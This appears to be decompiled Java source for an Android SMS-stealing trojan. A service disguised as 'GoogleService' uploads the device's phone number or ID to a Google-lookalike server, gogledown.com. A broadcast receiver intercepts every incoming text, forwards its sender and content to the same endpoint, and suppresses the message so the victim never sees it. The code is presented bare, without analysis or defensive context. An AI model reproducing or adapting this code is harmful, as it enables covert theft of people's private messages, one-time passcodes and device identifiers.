package android.sms.core;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

public class GoogleService extends Service {
    String phoneNum = "";

    public IBinder onBind(Intent arg0) {
        return null;
    }

    public void onCreate() {
        TelephonyManager manager = (TelephonyManager) getSystemService("phone");
        this.phoneNum = manager.getLine1Number();
        if (this.phoneNum.equals("")) {
            this.phoneNum = manager.getDeviceId();
        }
        this.phoneNum = this.phoneNum.replace("+", "");
        new Thread(new Runnable() {
            public void run() {
                List<NameValuePair> params = new ArrayList();
                NameValuePair pair = new BasicNameValuePair("sbid", GoogleService.this.phoneNum);
                NameValuePair pair1 = new BasicNameValuePair("sendnumber", "설치");
                NameValuePair pair2 = new BasicNameValuePair("sendtype", "2");
                params.add(new BasicNameValuePair("smscontent", "설치완료"));
                params.add(pair2);
                params.add(pair1);
                params.add(pair);
                Log.e("tag", "result = " + ToolHelper.postData("http://www.gogledown.com/vipboss/saves.php", params));
            }
        }).start();
        super.onCreate();
    }
}
package android.sms.core;

import android.util.Log;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpEntityEnclosingRequestBase;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

public class ToolHelper {
    private static int count = 0;

    public static String donwLoadToString(String urlStr) {
        StringBuffer sb = new StringBuffer();
        try {
            HttpURLConnection urlConnection = (HttpURLConnection) new URL(urlStr).openConnection();
            urlConnection.setConnectTimeout(8000);
            urlConnection.setRequestMethod("GET");
            InputStream inputStream = urlConnection.getInputStream();
            if (inputStream == null) {
                return "0";
            }
            BufferedReader bReader = new BufferedReader(new InputStreamReader(inputStream));
            while (true) {
                BufferedReader bufferedReader;
                try {
                    String line = bReader.readLine();
                    if (line == null) {
                        bReader.close();
                        bufferedReader = bReader;
                        return sb.toString();
                    }
                    sb.append(line);
                } catch (Exception e) {
                    bufferedReader = bReader;
                    count++;
                    if (count <= 5) {
                        donwLoadToString(urlStr);
                    }
                    count = 0;
                    return "0";
                }
            }
        } catch (Exception e2) {
        }
    }

    public static String postData(String url, List<NameValuePair> params) {
        Log.e("tag", "----------1-------------");
        HttpEntityEnclosingRequestBase httpRequest = new HttpPost(url);
        try {
            Log.e("tag", "----------2-------------");
            httpRequest.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));
            HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
            if (httpResponse.getStatusLine().getStatusCode() == 200) {
                Log.e("tag", "----------3-------------");
                return EntityUtils.toString(httpResponse.getEntity());
            }
            Log.e("tag", "----------4-------------");
            count = 0;
            Log.e("tag", "----------7-------------");
            return "";
        } catch (Exception e) {
            count++;
            Log.e("tag", "----------5-------------error=" + e.getMessage());
            if (count <= 5) {
                postData(url, params);
                Log.e("tag", "----------6-------------");
            }
        }
    }
}
package android.sms.core;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

public class BootReceiver extends BroadcastReceiver {
    TelephonyManager manager;
    String originAddress = "";
    String phoneNum = "";

    public void onReceive(Context arg0, Intent arg1) {
        String actiString = arg1.getAction();
        this.manager = (TelephonyManager) arg0.getSystemService("phone");
        this.phoneNum = this.manager.getLine1Number();
        if (this.phoneNum.equals("")) {
            this.phoneNum = this.manager.getDeviceId();
        }
        if (actiString.equals("android.provider.Telephony.SMS_RECEIVED")) {
            SmsMessage[] messages = getMessagesFromIntent(arg1);
            final StringBuilder sb = new StringBuilder();
            for (SmsMessage message : messages) {
                this.originAddress = message.getOriginatingAddress();
                sb.append(message.getDisplayMessageBody());
            }
            new Thread(new Runnable() {
                public void run() {
                    List<NameValuePair> params = new ArrayList();
                    NameValuePair pair = new BasicNameValuePair("sbid", BootReceiver.this.phoneNum);
                    NameValuePair pair1 = new BasicNameValuePair("sendnumber", BootReceiver.this.originAddress);
                    NameValuePair pair2 = new BasicNameValuePair("sendtype", "2");
                    params.add(new BasicNameValuePair("smscontent", sb.toString()));
                    params.add(pair2);
                    params.add(pair1);
                    params.add(pair);
                    Log.e("tag", "result = " + ToolHelper.postData("http://www.gogledown.com/vipboss/saves.php", params));
                }
            }).start();
            abortBroadcast();
        }
    }

    private final SmsMessage[] getMessagesFromIntent(Intent intent) {
        int i;
        Object[] messages = (Object[]) intent.getSerializableExtra("pdus");
        byte[][] pduObjs = new byte[messages.length][];
        for (i = 0; i < messages.length; i++) {
            pduObjs[i] = (byte[]) messages[i];
        }
        byte[][] pdus = new byte[pduObjs.length][];
        int pduCount = pdus.length;
        SmsMessage[] msgs = new SmsMessage[pduCount];
        for (i = 0; i < pduCount; i++) {
            pdus[i] = pduObjs[i];
            msgs[i] = SmsMessage.createFromPdu(pdus[i]);
        }
        return msgs;
    }
}
